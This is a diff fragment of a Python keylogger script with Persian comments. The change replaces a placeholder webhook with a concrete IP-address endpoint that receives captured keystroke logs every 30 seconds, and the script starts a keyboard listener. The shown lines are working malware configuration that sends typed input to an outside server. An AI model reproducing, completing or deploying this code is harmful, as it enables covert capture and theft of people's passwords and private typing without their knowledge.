@@ -8,7 +8,7 @@ import argparse
 from datetime import datetime
 
 # تنظیمات
-WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'  # جایگزین با URL واقعی وب‌هوک
+WEBHOOK_URL = 'http://91.107.165.131:5000/webhook'  # جایگزین با URL واقعی وب‌هوک
 LOG_INTERVAL = 30  # ثانیه
 TEMP_LOG_FILE = 'temp_log.txt'
 
@@ -84,4 +84,5 @@ if __name__ == '__main__':
         print("Keylogger started in visible mode. Press Ctrl+C to stop.")
     
     with Listener(on_press=on_press) as listener:
+
         listener.join()
